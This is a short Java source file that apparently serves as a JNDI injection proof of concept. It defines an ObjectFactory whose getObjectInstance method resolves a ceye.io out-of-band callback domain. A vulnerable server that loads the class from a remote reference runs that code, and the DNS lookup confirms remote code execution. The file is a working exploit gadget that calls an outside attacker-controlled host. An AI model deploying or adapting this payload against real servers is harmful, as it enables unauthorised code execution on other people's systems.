package run.ergou.jndi;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.net.InetAddress;
import java.util.Hashtable;

public class ObjFactory implements ObjectFactory {
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        InetAddress.getByName("v3vbk7.ceye.io");
        return null;
    }
}
